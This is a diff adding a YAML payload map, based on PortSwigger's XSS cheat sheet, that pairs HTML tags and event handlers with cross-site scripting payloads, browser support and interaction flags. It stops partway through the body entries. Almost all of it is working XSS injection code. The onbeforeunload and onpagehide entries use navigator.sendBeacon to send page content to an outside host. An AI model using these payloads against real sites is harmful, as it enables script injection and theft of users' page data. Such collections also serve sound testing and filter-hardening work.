@@ -1,0 +1,7603 @@
+# Super cool map of all tag/attribute combos able to execute javascript
+# Based on https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+'*':
+  onafterscriptexecute:
+    payloads:
+    - <* onafterscriptexecute=alert(1)><script>1</script>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onanimationcancel:
+    payloads:
+    - '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s
+      ease-in-out 0s 1 x;}</style><* id=x style="position:absolute;" onanimationcancel="print()"></*>'
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onanimationend:
+    payloads:
+    - <style>@keyframes x{}</style><* style="animation-name:x" onanimationend="alert(1)"></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onanimationiteration:
+    payloads:
+    - <style>@keyframes slidein {}</style><* style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2"
+      onanimationiteration="alert(1)"></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onanimationstart:
+    payloads:
+    - <style>@keyframes x{}</style><* style="animation-name:x" onanimationstart="alert(1)"></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforescriptexecute:
+    payloads:
+    - <* onbeforescriptexecute=alert(1)><script>1</script>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onblur:
+    payloads:
+    - <* onblur=alert(1) id=x tabindex=1 style=display:block>test</*><input value=clickme>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - safari
+    - firefox
+  onclick:
+    payloads:
+    - <* onclick="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncontextmenu:
+    payloads:
+    - <* oncontextmenu="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncopy:
+    payloads:
+    - <* oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncut:
+    payloads:
+    - <* oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondblclick:
+    payloads:
+    - <* ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondrag:
+    payloads:
+    - <* draggable="true" ondrag="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondragend:
+    payloads:
+    - <* draggable="true" ondragend="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondragenter:
+    payloads:
+    - <* draggable="true" ondragenter="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondragleave:
+    payloads:
+    - <* draggable="true" ondragleave="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondragover:
+    payloads:
+    - <div draggable="true" contenteditable>drag me</div><* ondragover=alert(1) contenteditable
+      style=display:block>drop here</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondragstart:
+    payloads:
+    - <* draggable="true" ondragstart="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondrop:
+    payloads:
+    - <div draggable="true" contenteditable>drag me</div><* ondrop=alert(1) contenteditable
+      style=display:block>drop here</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocusout:
+    payloads:
+    - <* onfocusout=alert(1) id=x tabindex=1 style=display:block>test</*><input value=clickme>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - safari
+    - firefox
+  onkeydown:
+    payloads:
+    - <* onkeydown="alert(1)" contenteditable style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onkeypress:
+    payloads:
+    - <* onkeypress="alert(1)" contenteditable style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onkeyup:
+    payloads:
+    - <* onkeyup="alert(1)" contenteditable style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmousedown:
+    payloads:
+    - <* onmousedown="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmouseenter:
+    payloads:
+    - <* onmouseenter="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmouseleave:
+    payloads:
+    - <* onmouseleave="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmousemove:
+    payloads:
+    - <* onmousemove="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmouseout:
+    payloads:
+    - <* onmouseout="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmouseover:
+    payloads:
+    - <* onmouseover="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmouseup:
+    payloads:
+    - <* onmouseup="alert(1)" style=display:block>test</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmousewheel:
+    payloads:
+    - <* onmousewheel=alert(1) style=display:block>requires scrolling
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+  onpointerdown:
+    payloads:
+    - <* onpointerdown=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpointerenter:
+    payloads:
+    - <* onpointerenter=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpointerleave:
+    payloads:
+    - <* onpointerleave=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpointermove:
+    payloads:
+    - <* onpointermove=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpointerout:
+    payloads:
+    - <* onpointerout=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpointerover:
+    payloads:
+    - <* onpointerover=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpointerrawupdate:
+    payloads:
+    - <* onpointerrawupdate=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+  onpointerup:
+    payloads:
+    - <* onpointerup=alert(1) style=display:block>XSS</*>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ontransitioncancel:
+    payloads:
+    - '<style>:target {color: red;}</style><* id=x style="transition:color 10s" ontransitioncancel=print()></*>'
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  ontransitionend:
+    payloads:
+    - <style>:target {color:red;}</style><* id=x style="transition:color 1s" ontransitionend=alert(1)></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  ontransitionrun:
+    payloads:
+    - '<style>:target {transform: rotate(180deg);}</style><* id=x style="transition:transform
+      2s" ontransitionrun=print()></*>'
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  ontransitionstart:
+    payloads:
+    - <style>:target {color:red;}</style><* id=x style="transition:color 1s" ontransitionstart=alert(1)></*>
+    required: []
+    interaction: false
+    browsers:
+    - safari
+  onwebkitanimationend:
+    payloads:
+    - <style>@keyframes x{}</style><* style="animation-name:x" onwebkitanimationend="alert(1)"></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onwebkitanimationiteration:
+    payloads:
+    - <style>@keyframes slidein {}</style><* style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2"
+      onwebkitanimationiteration="alert(1)"></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onwebkitanimationstart:
+    payloads:
+    - <style>@keyframes x{}</style><* style="animation-name:x" onwebkitanimationstart="alert(1)"></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onwebkittransitionend:
+    payloads:
+    - <style>:target {color:red;}</style><* id=x style="transition:color 1s" onwebkittransitionend=alert(1)></*>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+a:
+  onbeforecopy:
+    payloads:
+    - <a onbeforecopy="alert(1)" contenteditable>test</a>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <a onbeforecut="alert(1)" contenteditable>test</a>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <a id=x tabindex=1 onfocus=alert(1)></a>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <a id=x tabindex=1 onfocusin=alert(1)></a>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <a onpaste="alert(1)" contenteditable>test</a>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+a2:
+  onfocus:
+    payloads:
+    - <a autofocus onfocus=alert(1) href></a>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocusin:
+    payloads:
+    - <a autofocus onfocusin=alert(1) href></a>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+abbr:
+  onbeforecopy:
+    payloads:
+    - <abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <abbr onbeforecut="alert(1)" contenteditable>test</abbr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <abbr id=x tabindex=1 onfocus=alert(1)></abbr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <abbr onpaste="alert(1)" contenteditable>test</abbr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+acronym:
+  onbeforecopy:
+    payloads:
+    - <acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <acronym onbeforecut="alert(1)" contenteditable>test</acronym>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <acronym onpaste="alert(1)" contenteditable>test</acronym>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+address:
+  onbeforecopy:
+    payloads:
+    - <address onbeforecopy="alert(1)" contenteditable>test</address>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <address onbeforecut="alert(1)" contenteditable>test</address>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <address id=x tabindex=1 onfocus=alert(1)></address>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <address id=x tabindex=1 onfocusin=alert(1)></address>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <address onpaste="alert(1)" contenteditable>test</address>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+animate:
+  onbegin:
+    payloads:
+    - <svg><animate onbegin=alert(1) attributeName=x dur=1s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onend:
+    payloads:
+    - <svg><animate onend=alert(1) attributeName=x dur=1s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onrepeat:
+    payloads:
+    - <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+animatemotion:
+  onbegin:
+    payloads:
+    - <svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onend:
+    payloads:
+    - <svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onrepeat:
+    payloads:
+    - <svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+animatetransform:
+  onbegin:
+    payloads:
+    - <svg><animatetransform onbegin=alert(1) attributeName=transform>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onend:
+    payloads:
+    - <svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onrepeat:
+    payloads:
+    - <svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2
+      dur=1s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+applet:
+  onbeforecopy:
+    payloads:
+    - <applet onbeforecopy="alert(1)" contenteditable>test</applet>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <applet onbeforecut="alert(1)" contenteditable>test</applet>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <applet id=x tabindex=1 onfocus=alert(1)></applet>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <applet id=x tabindex=1 onfocusin=alert(1)></applet>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <applet onpaste="alert(1)" contenteditable>test</applet>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+area:
+  onbeforecopy:
+    payloads:
+    - <area onbeforecopy="alert(1)" contenteditable>test</area>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <area onbeforecut="alert(1)" contenteditable>test</area>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <area onpaste="alert(1)" contenteditable>test</area>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+article:
+  onbeforecopy:
+    payloads:
+    - <article onbeforecopy="alert(1)" contenteditable>test</article>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <article onbeforecut="alert(1)" contenteditable>test</article>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <article id=x tabindex=1 onfocus=alert(1)></article>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <article id=x tabindex=1 onfocusin=alert(1)></article>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <article onpaste="alert(1)" contenteditable>test</article>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+aside:
+  onbeforecopy:
+    payloads:
+    - <aside onbeforecopy="alert(1)" contenteditable>test</aside>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <aside onbeforecut="alert(1)" contenteditable>test</aside>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <aside id=x tabindex=1 onfocus=alert(1)></aside>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <aside id=x tabindex=1 onfocusin=alert(1)></aside>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <aside onpaste="alert(1)" contenteditable>test</aside>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+audio:
+  onbeforecopy:
+    payloads:
+    - <audio onbeforecopy="alert(1)" contenteditable>test</audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <audio onbeforecut="alert(1)" contenteditable>test</audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncanplay:
+    payloads:
+    - <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondurationchange:
+    payloads:
+    - <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onended:
+    payloads:
+    - <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <audio src/onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onloadeddata:
+    payloads:
+    - <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadedmetadata:
+    payloads:
+    - <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <audio onpaste="alert(1)" contenteditable>test</audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpause:
+    payloads:
+    - <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onplay:
+    payloads:
+    - <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onplaying:
+    payloads:
+    - <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onprogress:
+    payloads:
+    - <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onseeked:
+    payloads:
+    - <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onseeking:
+    payloads:
+    - <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ontimeupdate:
+    payloads:
+    - <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav"
+      type="audio/wav"></audio>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onvolumechange:
+    payloads:
+    - <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav"
+      type="audio/wav"></audio>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+audio2:
+  onfocus:
+    payloads:
+    - <audio controls src=1 onfocus=alert(1) autofocus>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocusin:
+    payloads:
+    - <audio controls src=1 onfocusin=alert(1) autofocus>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+b:
+  onbeforecopy:
+    payloads:
+    - <b onbeforecopy="alert(1)" contenteditable>test</b>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <b onbeforecut="alert(1)" contenteditable>test</b>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <b id=x tabindex=1 onfocus=alert(1)></b>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <b id=x tabindex=1 onfocusin=alert(1)></b>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <b onpaste="alert(1)" contenteditable>test</b>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+bdi:
+  onbeforecopy:
+    payloads:
+    - <bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <bdi onbeforecut="alert(1)" contenteditable>test</bdi>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <bdi onpaste="alert(1)" contenteditable>test</bdi>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+bdo:
+  onbeforecopy:
+    payloads:
+    - <bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <bdo onbeforecut="alert(1)" contenteditable>test</bdo>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <bdo id=x tabindex=1 onfocus=alert(1)></bdo>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <bdo onpaste="alert(1)" contenteditable>test</bdo>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+big:
+  onbeforecopy:
+    payloads:
+    - <big onbeforecopy="alert(1)" contenteditable>test</big>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <big onbeforecut="alert(1)" contenteditable>test</big>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <big id=x tabindex=1 onfocus=alert(1)></big>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <big id=x tabindex=1 onfocusin=alert(1)></big>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <big onpaste="alert(1)" contenteditable>test</big>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+blink:
+  onbeforecopy:
+    payloads:
+    - <blink onbeforecopy="alert(1)" contenteditable>test</blink>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <blink onbeforecut="alert(1)" contenteditable>test</blink>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <blink id=x tabindex=1 onfocus=alert(1)></blink>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <blink id=x tabindex=1 onfocusin=alert(1)></blink>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <blink onpaste="alert(1)" contenteditable>test</blink>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+blockquote:
+  onbeforecopy:
+    payloads:
+    - <blockquote onbeforecopy="alert(1)" contenteditable>test</blockquote>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <blockquote onbeforecut="alert(1)" contenteditable>test</blockquote>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <blockquote onpaste="alert(1)" contenteditable>test</blockquote>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+body:
+  onafterprint:
+    payloads:
+    - <body onafterprint=alert(1)>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+  onbeforecopy:
+    payloads:
+    - <body onbeforecopy="alert(1)" contenteditable>test</body>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <body onbeforecut="alert(1)" contenteditable>test</body>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforeprint:
+    payloads:
+    - <body onbeforeprint=console.log(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+  onbeforeunload:
+    payloads:
+    - <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+  onerror:
+    payloads:
+    - <body onerror=alert(1) onload=/>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <body id=x tabindex=1 onfocus=alert(1)></body>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <body id=x tabindex=1 onfocusin=alert(1)></body>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onhashchange:
+    payloads:
+    - <body onhashchange="print()">
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onload:
+    payloads:
+    - <body onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmessage:
+    payloads:
+    - <body onmessage=print()>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpagehide:
+    payloads:
+    - <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+  onpageshow:
+    payloads:
+    - <body onpageshow=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <body onpaste="alert(1)" contenteditable>test</body>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpopstate:
+    payloads:
+    - <body onpopstate=print()>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onresize:
+    payloads:
+    - <body onresize="print()">
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onscroll:
+    payloads:
+    - <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onselectionchange:
+    payloads:
+    - <body onselectionchange=alert(1)>select some text
+    required: []
+    interaction: true
+    browsers:
+    - chrome
